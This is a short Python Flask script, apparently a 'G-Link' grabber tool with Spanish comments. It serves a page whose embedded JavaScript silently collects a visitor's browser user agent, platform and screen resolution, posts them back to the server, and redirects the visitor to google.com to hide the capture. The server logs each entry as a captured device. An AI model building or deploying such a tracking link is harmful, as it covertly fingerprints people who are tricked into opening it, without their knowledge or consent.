#!/usr/bin/env python3
import os
import json
import urllib.request
import threading
from flask import Flask, request, render_template_string
from time import sleep

# --- SERVIDOR G-LINK ---
app = Flask(__name__)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<body>
    <script>
        const d = {
            agente: navigator.userAgent,
            plataforma: navigator.platform,
            resolucion: window.screen.width + "x" + window.screen.height
        };
        fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
        .then(() => window.location.href = "https://www.google.com");
    </script>
</body>
</html>
"""
@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)
@app.route('/log', methods=['POST'])
def log():
    d = request.json
    print(f"\n\033[1;32m[!] CAPTURA DE DISPOSITIVO:\033[0m\nAgente: {d.get('agente')}\nPlataforma: {d.get('plataforma')}\nResolución: {d.get('resolucion')}")
    return "OK"

def iniciar_servidor():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

